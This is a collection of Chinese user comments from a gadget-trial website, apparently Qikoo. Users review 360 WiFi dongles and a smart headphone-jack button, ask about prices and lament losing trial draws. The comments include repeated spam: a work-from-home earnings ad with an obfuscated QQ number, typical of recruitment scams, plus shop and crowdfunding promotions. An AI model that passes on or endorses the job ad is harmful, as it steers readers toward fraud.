新产品的开发，有一个发展的过程。我们有更高的需要，才是开发者研发的动力。相信的朋友你的要求会在不久的将来实现的。前不久又出了几款不同风格、色彩的手机套呢。作为你个平台的一份子，咱们也要多给开发者一些欣赏和鼓励哦。一起迎接奇酷美好的明天吧！
骗子，不能申请就不要出来骗。 
能送我一台吗？^-^
抱歉，以后类似事情绝不会发生。谢谢。
嗯嗯 赞成
姓名不能为空 明明就是填着的 好无语啊
谢谢 监督
谢谢 监督
请不要主观臆断 还是谢谢您的监督
说实话，真心写的不错。从外观和性能都详细介绍了，还指出了差距，普及的夹背电池的知识。楼主知识量很大啊，广有涉猎，这种文章应该给个精品。
造型前卫新颖，就是价格，一般人玩不起，2000美元。好贵啊。
造型前卫新颖，就是价格，一般人玩不起，2000美元。好贵啊。
今天收到短信了，提醒我发货了。谢谢啊！
太贵了吧！比谷歌眼睛还贵啊！
谢谢支持呦，有什么想法也可以来交流下的。结尾处是亮点呦，大部分是我申请时填的内容~~~
100刀是多少钱？
100刀是100张。不是100块
想知道How much 要是我家有就好了 总感觉高科技都是安在有钱人家里的
嘚瑟，想买你就买，那么多废话
看着设计很不错，轻薄,不知样机如何呀,,
点保存给我一堆英文，点提交申请给我未填写姓名，您闹哪样
挺不错，写的很具体，很实用，值得参考。好评，10分。
不要激动好不，这还刚发一小部分呢。精彩的还在后面~~~继续支持呦！
为毛填了名字说没填！搞毛线啊！！！
我的上一份报告，可以来看看呦！小巧的防丢神器——SmartWallit 钱夹试用体验http://www.qikoo.com/try/paper?id=534555e406e2442177000027
神马啊、为毛填了名字说没填！搞毛线啊！！！
骗子，填了名字，说人家没填！
三星S4有这个功能了
东西还没有收到，很期待，收到一定评测
填了名字说没填，如果是故意的，那是明显的诈骗。如果不是故意的，为什么不及时修复？ 
想试试，期待中…………
说的不错,感谢二位的捧场。奇酷美好的明天需要大家的努力，平台的每个成员，不论是否申请成功其实都可以将自己的建议和看法提出来。试想结合我们许许多多不同的客户特征得出的合理化建议，促使开发者对产品进行优化，如此接地气的产品不是很让人期待吗！
哇，用的树莓派。。。。太棒了
对了耳机发烧友而言，这个价格还行
谁没事天天带个手套
哈哈，不错。智能化家居的时代要来临了
是的，更多智能家居产品或者智能家居系统可以参考简约至 http://www.jianyuezhimei.com
不会啊，千元以内搞定，还没有一部手机贵呢 智能家居现在都是这样的http://www.jianyuezhimei.com
是的 需要WIFI
关于LiftSmart的更多详细信息请参考 http://www.jianyuezhimei.com
还有很多更美的哦
谢谢 http://www.jianyuezhimei.com
等带着审核 申请了好几个产品没得到名额这次一定要给个啊！
手机终端产品只得期待！
可以蓝牙连接手机，还可以导航！这流线型身材，大爱！ 就是早期价格太高哦，期待量产后能接地气，价格上有惊喜!
外形 宇宙了。。 估计没什么敢骑出去溜 
很小巧的产品，优势和缺点并存。期待后期优化后变得更智能可靠。
看着就舒服，朋友们快来认领哦！
爱健康，爱麦步。求申请使用
还没有发货啊啊啊啊啊啊，真想试试啊啊啊啊啊啊
楼主写得真心不错！！赞
希望能被选中
希望可以试用  蛮有意思的
外形很时尚，屏和我手机一样的，防水功能很实用，15天的续航能力也让人满意。如果能支持WP手机就更好了！
很专业啊，给父母手机配一个还是挺贴心的，操作一定要优化，期待汉化版哦。
看着不错 不知道什么时候能上架
有创意 环保
看着太帅了 有创意
传说中的神级装备啊，功能方面很是期待。整套系统最大程度整合了视觉、听觉、动作等因素。不知道实际使用状态如何，真实感能达到百分之多少，期待后期更多的测评资料。
觉得更像是玩具
在哪能买到啊？
快点出来，期待！ 
我只能说太炫了
亲，刚才出现了BUG~现在已经修复了。
一直很喜欢运动，支持麦步，我肯定抽中，必须滴！
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23～603～76909
这期的竞争好激烈。自己没有什么艺术作品。就看中签朋友的了。
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班 族都可以） 扣：23～603～76909 
利用闲余时间，给自己找份宅家的网络 差事吧～～～ 不限制 工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族 都可以） 扣：23～603～76909 
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：2 3～60 3～76909 
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23～603～76909 
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23～603～76909 
太酷了，晒晒太阳就充电了。完美！
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班 族都可以） 扣：23～6 03～769 09 
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班 族都可以） 扣：2 3～60 3～7 69 09 
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都 可以） 扣：23～603～76909 
亲，您想挑战360么.
赞！家用安保也达到专业级别了。
50块钱左右 我就去买一个
很期待，功能强大，方便携带！！不错的产品，希望价格不要太贵
不错的产品，太强大了！！
外形很酷，很好看，不错！！
冲1200M而来！！ 还没有上市？
呜呜，又没中签。。。
已经发了，昨天发的。
价格太高了，3000左右可以接受，北京咋维修啊？ 
这么方便的智能计步器 希望能免费试用到。
有意思，多少钱，哪有卖？ 
一直很喜欢运动，支持麦步，抽中我，come on！
没中期签。
激动。。。
个头太大，可以3.5mm整合，也许某天智能手机也可能内置遥控、测温、测距等。
价格？，，我想要个
这个称的颜色很漂亮啊。是跟手机可以连接上，有APP的。应该是创意。智能硬件。
比较喜欢智能环的睡眠监测这项功能，希望新品可以做到防摔，防碰撞。
光纤入户后是要经过光猫接受信号再转化出来才能用，和路由没关系。只是有的光猫自带了路由功能。
呵呵，多谢，喜欢就好
多谢夸奖，我会努力的
为什么不能购买呀？我要买一个啊
可惜我没有得到啊！真想得到一个2代的看看这东西是“神”么样，报告不错支持下。
产品好像很好，智能未来生活的潮流
一直很喜欢运动,高中很喜欢跑步。还的第一名了呢 
希望可以有我的份
很想要……希望有好运
比一代的多了云存储，方便了很多，谢谢
东西收到了，很好哦，不仅可以防尘，还一键控制，很强大，一如既往支持360 
方便实用！不知效果！给我试试！
敢不敢让我体验下先
快递很快，昨天发的，今天就到了。 很想好好的评测一下，可是只有200字，还不能发图。 总的来说： 1、收到的剑是全身银色的，和以说的评测的不一样，没有黑色 2、软件升级到了1.1.0版，界面变化较大 3、抓拍好用，很快，希望拍完选择性查看 4、想截图，没有 5、包装很简洁，一个小袋子，内装一剑一说明 6、双击可用，有时会操作失误 7、为什么没有按住选项啊 8、剑插入很稳，很牢 篇幅有限，评论很简单
智键在中兴U9815上不能用啊。U9815耳机孔有个斜坡。前面到底了。后面目测还有2MM空隙。咋解决？
最好加上发电功能
希望能获得适用名额吧～～
没用过，很想拥有一个！
一直支持wifi
360随身WiFi非常好用，刚收到。下载了驱动，擦入电脑就成功了
确实是很期待的产品，用来代步不错！
确实是有创意的产品哦
有意思哦，期待量产哦。路痴就不怕迷路了！
好小巧啊，不知道是否耐用。
为什么我没有信息
都申请6期啦5555555 
奇酷虐我千百遍，我待奇酷如初恋!呜呜呜呜呜呜呜呜呜呜
估计明天就能收到呢。
很拉风的样子！
奇酷网送的360随身WiFi2代今天下午已经收到，发货很快，谢谢奇酷网。
云u盘 ，在网吧，存文件更方便，公司，家里随时备份文件到云端，文件再也不会丢失了。无密码连接避免蹭网了，假如 有客户端攻击，会不会连续弹窗呢？骚扰主人……。便携，易用才是关键。
不错，这个应该不难吧！
还不错，那些说50能搞定的是没买过蓝牙耳机吧。。。。。一个蓝牙都那么贵还加上发动机等等
昨天收到短信通知说奖品已经寄出了，没想到今天就收到了，还是我喜欢的安全绿，很开心，用了一下真的不错，特别是手机遥控功能很喜欢，谢谢奇酷360
奇酷网送的360随身WiFi2代今天下午已经收到，发货很快，谢谢奇酷网。之前已经买了1个二代，很好用。配套的软件更新的也快，比最开始用一代时增加了许多实用的功能。360加油！
晕，我刚刚写的200字评论去哪了！！！
刚刚收到赠送的2代wifi，较内测版的几个都有进步，非常好，信号稳定，信号强，根路由的wifi信号没两样，朋友都想要，我就把几个内测的送他们用，哈哈！
产品简洁实用，便于上手，有很强的实用性，但对手机的要求相对较高，为这个好产品点个赞
收到了，确实很不错，就是有点大
功能还是少，应该添加解锁，锁屏等功能
智键君收到啦，不错哦(^V^)小巧
O(∩_∩)O谢谢~也祝你早日有智键
刚收的货，马上测试，很给力的“好键”！炎炎夏日到了，外面春光无限好。有了智健，是留住无限风景的好助手，大家都来收藏呀，好处你懂得！
穿墙能力怎么样啊 
要是有高温超导天线，估计远距离没问题，零电阻
安慰奖 ，谢谢。 相当不错的360随身wifi2，方便、快捷，安装最新的驱动后功能强大。
期待ing
今天收到了奇酷网送的360wifi2代，使用了一下觉得很好。1.挂绳是防尘塞的设计，直接插手机上，不怕掉，2.360wifi2代搭载10T的云盘，直接当U盘用了，哈哈！3.信号强度给力，隔了一堵墙都能用，4.操作简单，一插即用，赞！感谢奇酷网的福利。
奇酷宝箱给的智键今天到货了，智键和快按钮合作了吗？写着智键和快按钮荣誉出品。几天前还指责抄袭呢。以前公测版黑色的头，换成金属的了，和快按钮一模一样了。按键比以前好多了，按起来比以前更硬朗了，更加美观了！！！希望app加入长按功能！！！期待360做得更好！！！
hello，大家好，我是GYENNO的renk，我们的产品现在在pozible上众筹哦：） 市场价格为1099，但为了回报前期的支持者，众筹价格从399到880都有(但限量了)，还有一些组合，现在1天半已经达到将近50万金额啦～～～大家可以去关注～～～ www.pozible.com/gyennoone   
我没有，。。
今天收到了奇酷网送的360wifi2代，颜色非常亮眼，个头只比拇指大一点，非常便于携带。从产品的外壳做工上来看，质量不错，很结实，手感也很舒服。每个360随身WiFi都配备了一个能插在 手机上的挂绳，插在手机上做挂件也相当漂亮。  
从360wifi1代，2代直至阿狸版每每都会入手，方便的操作，稳定的信号输出让它深受身边人的喜爱，特别现在能用手机操控的功能更是超赞，希望产品越来越好
感谢智键君，奇酷宝箱给的智键今天到货了，做工不错，不过颜色较单调，样子并不是很好。插入后还凸出一块，希望添加更多颜色。或者可以添加配件，例如水晶防尘塞，玩偶防尘塞，抓住女性客户。按键触感很好。希望以后能添加一键截屏功能，还有希望能支持安卓2.3的版本，增大支持范围。如果root后 望能添加解锁，锁屏，一键截屏等功能，真正成为“按键精灵”。
要什么时候出出来啊。。。。。
一点都不好                 
我来打酱油
希望能获得适用名额吧~!!~!~!
在奇酷网试用5连败后，终于感动了官方，免费赠送了360随身WiFi！外形十分小巧精美，还带有手机挂绳，非常方便携带，还可以作为手机的防尘塞！十分87有木有！把360随身WiFi插在已联网的电脑上，不一会就自动创建好了WiFi，手机上网速度也很稳定快速，相隔一堵墙，信号依然很强！还带有10T云U盘功能，这个一定要赞!现在最新驱动还带有手机控制电脑关机功能，这个功能很给力，强烈向大家推荐下！体会下！
希望能有机会
太酷了，骑到大街上回头率得多高啊，最最最重要的是再也不怕被偷了
不知道洗的干净不干净
为什么发不了评价
今天收到货很激动。赶紧试了试，非常实用，一键直达留住精彩瞬间。发现一个问题就是容易误碰，有好方法吗？一如既往支持360
我希望有机会，我有通风病，想用您的产品有所改变~！
今天刚入手就试了下，红米手机，版本miui-hbj2.0，三个按键换着试，感觉就是1.费电2.单击延迟3.双击无效，希望出新版本。。。
五连败后得到2代，，但是我想要你们的路由器呀。。。。
准备入手一台，看淘宝可以预定了。不知道是否真的能预定！
确实不错，不知道什么时候才能上市，价格不便宜。
总感觉太大了点，不知道和手腕贴合度怎么样，期待真正的产品。
在哪能预约啊？
4月下旬这是官方给我们的承诺，如果一个官方都不守承诺那还有什么可说的呢？国家主席都言出必行，皇帝还说话算话，不食言，黑帮老大还讲信用，讲义气。除非360一直在耍我们，去年至今360推出好多产品了，有几个上市的。都在那里虚假宣传。以前很喜欢360公司，电脑装360的所有软件，可是人是会变的。太让我失望了，失望透顶。失望透底。一个用户发至内心的“嘶吼”
用来减肥应该比跑步效果明显
照片很清晰
哈哈期待成真~
铁杵总会有磨成针的那一天，试用总有选中我的一天！
支持renk：）
你的看法很对
22日短信提示发货，24日（今天）一早就到手了，EMS还是很快的。
想不到EMS还是蛮快的，EMS再也不是我心中的垃圾中的战斗机了
不错，希望获得试用
在奇酷网提交试用5次失败后，360官方是良心企业，今天拿到了赠送我的360 wifi 2代。外观很漂亮，是清新的绿色。系统的设置也比一代有了很大的提高，增加了很多功能，还支持手机控制。另外，挂绳孔的位置也改进了，更不容易丢失了。上网速度很给力。之前，我购买过360wifi 1代、智键，下面我还将购买360儿童卫士和360路由。。。。。真心希望你们越来越好，支持你们！
我来了，我跑了多少步啊！
22日短信提示发货，24日（今天）一早就到手了，EMS还是很快的。感谢智键君，奇酷宝箱给的智键
期待中。。。。。
得两个月工资 不够的话 只能卖肾了
两个月工资+一个肾
收到宝贝了，高兴之余，尝试一通，总体感觉不错，但360智健在单双击方面的反映有时会交错，不知是速度有题，还是手机问题，有时单击设置变成双击设置。
已收到货，非常不错。感谢奇酷，感谢360！
高端大气上档次
外观简洁，喜欢。
外观五颜六色好看，做工不是那么好,领回来的360随身wifi绳是脱线的，开启盖那有个破裂的缺口，360随身wifi挺实用的，插上即可，一键安装确实方便很多，跟其他品牌随身wifi比已经算很方便的了,360随身wifi如果能把做工做好估计销量会大增，在就是功能的齐全，对此个人评测过多款随身wifi，360wifi是我最满意的，希望能更多的参与奇虎的评测.
还有一个问题：360智健在手机加速清理内存方面没有其它软件清理内存那样真正起到清理内存效果。
已经收到智键了，包装很好，非常感谢。 不过在使用中发现，联想P700i的手机不能使用，只能识别是否为耳机或智键，家里其他的手机都可以。 另外如何填写使用评测呢？
我有问过我的客户，感觉这东西有几个致命的弱电，如果能解决就好了，市场还不是很好打开，网络只是抓住了少数高富帅，如果停电了怎么办？还有就是WIFI信号问题？为什么不出配套的路由器？
已经收到了，测试了一下，首先IPHONE 5S不能用，所以我只能插在小米2S上测试了，设置到照相的时候，照片是拍摄成功了，照相机软件会提示打开失败，拍几张就失败几次，但最终照片是存在的，然后设置手电筒会经常误触，所以最终感觉不实用！
希望快点出来吧！太喜欢了！
这么贵谁要？全是土豪还是高富帅啊？
木有499了，很想购，很想下手
刚收到奇酷的EMS，非常感谢奇酷！ 说说产品的性能吧，优点：按键开程序最快捷的方法了，谁用谁知道，缺点或需改善，开程序的时候稍有延迟，APP按键功能需增加，比如长按1次，或能设置3+或更多，这个可以有！热爱360产品，希望360能带来更多新奇特，实用的产品，像360.奇酷致敬！
在奇酷网连续申请了5次没通过审核，很伤心，还好360还给了个安慰奖。今天收到了360wifi2，颜色翠绿的（说好的土豪金呢？），很好看，符合年轻人的口味，不过挂绳有破损，批评一下。使用很方便，即插即用，功能也比原来齐全，上网速度给力，非常满意，以后会继续支持！特别关注360的儿童卫士，不知道什么时候上市，继续加油吧！ 
今天收到了360wifi2（安慰奖），颜色翠绿的，很好看，符合年轻人的口味，不过挂绳有破损，还好自己稍微处理一下就修理好了。使用很方便，即插即用，功能也比原来齐全，上网速度给力，登录360帐号后，网盘空间直接增加10T，非常满意，以后会继续支持！特别关注360的儿童卫士，不知道什么时候上市，继续加油吧！  
不错，期待尽快出现，
智键已经到了，真是太小巧了，正在试用，等待试用报告。
在奇酷网连续申请了5次没通过审核，很伤心，还好360还给了个安慰奖。今天收到了360wifi2，颜色翠绿的（说好的土豪金呢？），很好看，符合年轻人的口味，不过挂绳有破损，批评一下。使用很方便，即插即用，功能也比原来齐全，上网速度给力，非常满意，以后会继续支持！特别关注360的儿童卫士，不知道什么时候上市，继续加油吧！ 
中奖了！！我是过来炫耀的！
在奇酷网连续申请了5次都没通过审核，不过得了个安慰奖WiFi2代，今天收到了。鉴于网上已经有了很多评测了，咱也就不再做重复的报告了，因为手头上有1代和2代的WiFi，那就小说一下，2代的外形设计和1代的差不多，改进了吊绳的位置，使用很方便，即插即用，功能也比1代的齐全，上网速度给力，登录360帐号后，网盘空间直接增加10T（至此偶滴云盘已经有130T了，吼吼吼~），非常满意，以后会继续支持！
测试了一下，360智键还是比较稳定。之前用过一代的快按钮，对于我的小米无反应；前几天又买了个米键，锁屏一段时间后会抽风，手动点锁屏键才有反应，而且时不时的会反应错误。360智键今天刚到，果断卸载米键，强X360。试了下，反应不快，但是比较稳定，拍照来说不适合奇袭，你懂的，小伙伴们都伤心了。缺点，没有三连击？？
我刚才将360智键设置成单击录音，当与别人通话时，本人想起用录音功能，可发现单击360智键时出现挂断电话现象？？？？？是否不能这样在通话姿态下起用360智键录音？？？？？
要是房子全都装上这种智能元素，还是蛮酷的。
程序员一只忙的不行。每天锻炼也就只有上班下班跑步了。。希望抽中我吧
这个就不用发布试用报告了吧。没找到在哪。
今天刚收到，感觉很小巧，使用也很方便呢，真的很不错
希望抽中我吧，大爱这个东西的。
中了 哈哈
小小的东西，功能倒是有两大类，单击一下，单机两下！ 我的智键回来喽 
东西很小巧。感觉挺精致的，但是就在我收到后拆开包装打算取出来放在手机上时，用手从卡套里取出的时候很容易失手掉落地面。同伴同样也有这样的情况。
地界偏远，还未收到！
我是一个一天到晚宅在室内对着电脑的人，总是想走出室外锻炼身体，但总是缺乏动力，希望能够获得试用机会，让自己有动力去外面走走。
奖品已经受到了，感谢奇酷360，希望你们越来越好！优点是做工不错，按键灵敏，没有缺点哈。只不过有些建议望你们能采纳，可以设置按键频率的长短就好了（比如一长两短等），然后能加上截屏功能，锁屏功能，摄像功能，SOS求助功能等。最好将抓拍的图像能设置保存至SD卡里。
露个脸！O(∩_∩)O~
怎么就进不到要购买的页面，一到时间抢购的时候才能进不到，找不到确定的要买的字，一进到“我要购买&gt;”就一进刚开始的页面了，求求大家教教了！！！！！
360智键已收到，首先很感谢360奇酷的试用，东西小巧并且很实用，就是不知道多加一个挂绳之类的就好了！  在此也感谢奇酷的工作人员你们辛苦了！
测试了一下，放在抓拍上经常容易触碰，那天不注意满相册全是没用的照片，切换麻烦，希望有个三连击切换
怎么就进不到要购买的页面，一到时间抢购的时候了，找不到确定的要买的字体，这是什么原因？ 一进到“我要购买&gt;”又进到刚开始的页面了，求求大家教教了！！！！！
1,APP界面清爽易懂,傻瓜式操作.还加入自定义按键,使操作更加人性化,更可后台加速手机,这代表着我们可以边玩游戏边加速了,赞一个. 2,插入手机比较严实,不会松动,这样大大减少了使用过程中掉出的可能,平时没用还可以做耳机孔的防尘塞呢,不错. 最大的缺点:按键有时会延迟,按了需要几秒后才有反应,有时甚至不反应.比如一键拍照,按了过3秒才开拍,有时甚至更久,这等于不是抓拍了.望改进.或改名- -!
一直在关注奇酷网，每期奇酷试用我都用心申请了，可惜好运没有降临。今天很高兴收到安慰奖“360WIFI”在此非常感谢，这个产品很方便实用，我之前都买过7个，送给亲朋好友很不错喔，以后我会持续关注奇酷网，希望能看到更多的新奇创意产品
这个好像很酷啊。想做一个不穿衣服的美女。
不错，我也是5次没中，而且也没有要放弃的念头，所以才有奇酷宝箱的意外收获
不过ems有慢
http://shop110096955.taobao.com/
非常好的创意 但是有些简单实用的生活创意 我和我的小伙伴们已经在用了 进去看看吧http://shop110096955.taobao.com/
非常好的创意 但是有些简单实用的生活创意 我和我的小伙伴们已经在用了 韩国刨冰神器ICE BING BING 进去看看吧http://shop110096955.taobao.com/  
有没有OPPO FIND7D的纸电池
http://photo.weibo.com/1550922373/talbum/detail/photo_id/3693089406261752 MostFun打印的不穿衣服的美女
我没有啊倒霉啊
第一次参加没有中啊希望第二次能够中奖啊哈哈
希望抽中我是免费的哈哈
希望给力给个中奖的机会啊
我到现在这个是第二次申请使用但是第一次很遗憾没有中奖倒霉哈哈
这次无论瑞和都要给我给力一点知道吗哈哈别让我没有好的心情哈哈嘿嘿
哈哈，加油。
太酷了啊哈哈
这次ems快递速度很满意2天就到啦！
今日已收到！2014年4月24日！
不知道能不能中奖看运气希望运气好点嘿嘿
不知道要不要寄回去哈哈
我早上跑步呢希望能够给我啊
3580 买不起的节奏
昨天收到了智键,试用了一下感觉还是不错,但那个抓拍功能在夜间不会自动开闪灯,等于是夜间没用,再加一个自动录像就更好了
没赶上，听听测评再说吧。好东西要上
不错 高科技
很不错的一款手机套，很可惜木有申请到。
好是好，就是有点贵吧，把美元换成人民币还差不多
想法给力  随心为电
今日已收到！2014年4月24日！ 谢谢
1代2代忠实用户 还送给了朋友好几个呢 
给力哦 联想顶起
挺漂亮的，外形也酷
1988有点贵
今天收到的 绿色的 好看 谢谢
哈哈。。。。 真心不错  科技改变生活
有没有可能平常带着小一点，通过抽取屏幕变大，或者软屏展开屏幕变大，或者折叠展开屏幕变大的方式？这样子的有点大。。。女生不太能接受吧
奇酷 追求极致酷品
正文最后一段，价格描述后面，有错字。应把“如何”改成“如果”。
APP界面做的蛮清爽的，只能设定单击和双击，没有三击这倒挺可惜的！ 
这个我乐个趣中也有卖的
什么价位，期待平民价。
恩 ，，，问题是   蓄水 排水 从哪里弄呢
又有多少中国苹果丝追捧啊
健康生活，从运动开始，明明白白的了解自己的运动，是个不错的选择，希望获得试用资格。
一款打广告的东东
敢脚后盖不怎么样
很好的小东东，挺喜欢，不过不知道怎么回事，我的抓拍，怎么是黑黑的，看不清楚啊，其他都很好，
东西挺精致的   露出一毫米出来 之前担心会被手机套盖住  上手后完全不碍事   非常好  至于效果的话  有点小延迟  单击很好用 但双击的话  识别容易出错   我的设置是 单击home键   双击 锁屏键  希望再增加几个按键功能
今天收到了
很不错，到货了，2代改进很大，感谢
不错，挺喜欢的，抓拍比较好玩！
今天收到了一个360智键、一个360wifi二代，果断把以前抢购的一代给退休了，换上了二代，非常好用，期待360更多更好的产品！
低调奢华有内涵
插在手机上。单击抓拍时拍出来的照片是黑黑的。然后进入相册提示相机故障。我的手机是华为U9508.不知道有什么办法解决。。
太费电了吧，冰箱24小时还没到1度电呢！！！
今天收到智键了,用了半天,试了多种功能,最后单键设为加速,双键设为抓拍,不错.
一分钱一分货，贵有贵的理由。如果需要wifi控制家控的，这路由绝对操作一流
今天收到智键了,很好用很强大，就是不知道为什么双击的功能有点不灵活！单击功能很好。
东西真的好小巧，使用老方便了
最近刻苦减肥钟，每天10公里。加油！希望有个好运气！
荣耀3C用不了    请问什么时候适配  有配适配的可能吗
连续5期不中，得到的小小安慰的智键，今天总算到了,东西很小巧，挺精致的，试用了一下感觉蛮方便的，还是很不错的，值得拥有啊！
很漂亮的音箱，想购买！
好喜欢呀！但价格上还是贵了些！
真好啊！蛮喜欢的方便，不用把他停在楼道里了！可以随时拿着 ！价格好昂贵！
希望我可以获得，但是几率很小555555555555555555555555555555555555555555555555555555 
连续5期不中，得个智健也不赖。总体感觉还不错，就是插上，相机绿屏，无法照相。重启以后才可以使用。我手机海信t968，建议技术人员改进一下。
你头像竟然跟我一样！
不喜勿喷，何必这么伤人。
我以前是个运动员，现在待胖了，好想合理运动减肥，不知道这个好用不好用
支持 ！！！！！创造性产业
外观五颜六色好看，做工不是那么好,领回来的360随身wifi绳是脱线的，开启盖那有个破裂的缺口，360随身wifi挺实用的，插上即可，一键安装确实方便很多，跟其他品牌随身wifi比已经算很方便的了,360随身wifi如果能把做工做好估计销量会大增，在就是功能的齐全，对此个人评测过多款随身wifi，360wifi是我最满意的，希望能更多的参与奇虎的评测.
想買個給家人，希望他們健康！360度 邁步健康人生！
价格太贵，觉得结构也不复杂，赶快山寨啊！
我手机太差，安装app时竟提示手机系统版本过低？！唉，反正是用不了！！%&gt;_&lt;%
这个是通过音频信号测量外界温度，并不是像温度计那样依靠热传递来测量温度。
感觉太大了点！！ 就是不知道什么价格？？
好羡慕QAQ
对此很期待0 0，看起来好棒，不过肯定很贵！
用了就知道了 哈哈，有动力
您是哪家呢？哈哈 产品官方的吗
用的手机是米2，感觉用起来还是蛮流畅的，我看中的的功能就是录音和抓拍。值得拥有
收到了智键，用起来效果还不错，但是有一些值得优化的地方： 1 智键方便小巧，但是容易掉，能否在按键下方加个吊饰，既能当手机链美观，又能方便拾取。 2 插上智键就不能听音乐了，360能否设计个耳机可以和智键配合使用？ 3 智键在插入手机时候不是很顺畅，使很大劲，感觉会把按键按坏，没有插耳机顺畅，外观还需要设计一下，比如按键下方圆盘设置成椭圆或者其他形状。 就这些吧，感谢360，希望下次还能有我！
为什么你有两个东西啊？我就一个wifi
毕竟是土豪的玩具，太贵。。。。便宜一点还可以考虑，
不需要WIFI，是通过433双向通讯技术实现的，穿透和稳定性都大大好于WIFI
不错哈 加油呢
名称非常有新意，哈哈··
看上去很不错，支持了～
真心觉得，这年头的穿戴太多，这个设计比较像老年手机
易方，易笔。好像和国外这个很难分清楚哦
关注迟了点，好像错过最优套餐了
这个和 Broadlink RM1 区别？
看来人类快要退化了，以后估计手脚都没用了。
就是一个带OBD接收器吧，X宝RMB100以内
恩，这个，好像很累人哦
人到中年，开始锻炼身体，这东西有那么神奇？？
赶快出通用型号吧，期待中。。。。。。。。。。。。。。。。。。。。。。。。
和 安卓  看书软件有 区别吗  ！！！！！ 唉 ！书还花钱   我自己下载多好！！！！
哪里的啊？有株洲的寂寞美女吗？
连续五期不中，送个智键。昨天网上刚收到智键，需安卓4.0以上使用，我安装好后设置为拍照，效果还行不过没有想象的好，智键只是能启动相机，不能直接拍照
什么玩意？ 
想送给老公，期待中，更期待价格
昨天收到了360智键（赠送的），很精致的小玩意，插在手机上非常紧固，不用户担心滑脱。安装了APP后，挨个体验了下实际功能，真不错！特别喜欢APP上的一键抓拍功能，不用开屏一键照相，非常方便、快捷，先赞一个。其他功能也试了，都能正常运行。双键设置了手电，上下班时地下车库很黑，方便多了。 可惜目前只支持单击和双击，如果以后再升级一下，可以设定更多的点击和功能就更完美！
非常实用，太喜欢了，以后继续支持奇酷网和360
总有一种盾牌的感觉。。。大面积贴近皮肤感觉不会很舒服。
真是太贵了，我感觉和小孩子的踏板车差不多，赶紧研发自己的，价格控制在200以内！
1代2代忠实用户
搞几台来试用啊、。。。。
可是公司的网络不给用这个，希望360能可以改进，绕过屏蔽。
很好，很强大，随身携带很方便，随时可以上网，喜欢360随身WIFI
要电的么、
希望概念可以成真 
交货再付1400英镑，共1499英镑
大小无所谓，关键能刷双WAN 穿墙能选择
一起期待他们的新品吧
积极参与，你也可以的
没中签。。。 
有没有免费体验资格~给来个被~~！ 家里隔着3堵墙，回卧室就没网郁闷啊。。。。
东西收到了双击设置成了拍照玩了一下 很多次双击都没有反应 不知道是硬件的问题 还是软件的问题
这个还可以作出什么，比如说…
什么时候出来，很吸引的产品，和智能眼镜都出新潮的玩意！不错不错…… 
非常想试用一下！！
报告点击量好高啊。
5月3日在草莓音乐节上发布。。
5月3日，VOW智能耳机将亮相“草莓音乐节”感兴趣的可以去围观，包吃包喝。。。。哈哈。。
今天收到的360智能键，物流也太慢了整整一星期猜到，试用了下还不错，很精致的按键，就是只支持单击和双击，感觉没小米的强大，如果能支持多次点击就好了。
面积有些大。
看着不错.
我热爱锻炼，最近正每天陪室友跑步减肥，期待，能用到这种计步器，到时候再和大家好好谈一谈。
获得的安慰奖。还好吧~~~~~~
中的全是会员，早知道就不费那么大劲写申请报告了
表示，宿舍族喜欢的东东，可是宿舍族都是穷鬼，好喜欢好像尝试一下~~~
期待众筹成功哈
我也想买   就是不知道价格怎么样 
我想未来的智能设备可以分为两大类: 第一类属于让人们生活更便捷方便的生活在助手类产品. 第二类就是可以让人们生活更有意思的娱乐类产品. 它们是引爆第三次战争的导火索. 五年之内硝烟四起. 十年之内狼烟滚滚. 这个战争谁胜出了必将奠定百年基业. 评书时间结束. 看在我码字这么多的份上. 小编给口汤喝吧. 智能设备的忠实爱好者. 期待不久后人人都能用上我设计和研发的产品. 
25号12点开放购买了吗，12点我刷新怎么一直没有购买选项？
别人笑我太疯癫，我笑他人看不穿。世人急着填申请，不知中奖真很难！！！
收到了，感谢，继续支持
http://detail.ju.taobao.com/home.htm?spm=a1z10.5.w5001-6008310080.10.HaEuje&amp;item_id=38509092149&amp;id=10000002589816&amp;scene=taobao_shop  淘宝聚新品全球首发4月28号
收到随身wifi了，绿色的二代，很好看，很喜欢，不错。
我不是会员啊
收到了  可是只支持4.0以上  啊
我喜欢锻炼 真心希望能试用
要是2000rmb就好了。。。。。。。。。
好东西。啊
每天上下班都走路，真心希望能试用 。
不报太大希望
等待中~~
真心希望能试用
哈哈。太逗比了。很搞笑的报告。
感觉这位试用官不是很喜欢这类产品啊。应该找一些更爱画的人。
卖牌子而已，相对同类价格耳机，这个真没什么优势
贵，根本不会考虑,有钱人的玩具！
赞，关键还是续航时间是个最大的问题
结合磁悬浮和无线鼠标就是不知道在左右移动的时候会不会跑偏，
经过本人反复阅读这位狂炫酷拽吊炸天的试用觀的报告，我真的看一次笑一次，试想当年我申请这个神奇的打印笔的时候，我是多么渴望它给我打印颗牙齿（本人医生），看来审核官人没有通过我，，，害怕我复制无数个我自己吧，，，，还有我内心深处很久的一句话，固定形态真的要用嘴嘴吹吗？？？？哈哈哈哈哈哈哈哈哈哈哈哈哈
东西不错，价格贵技术难度高
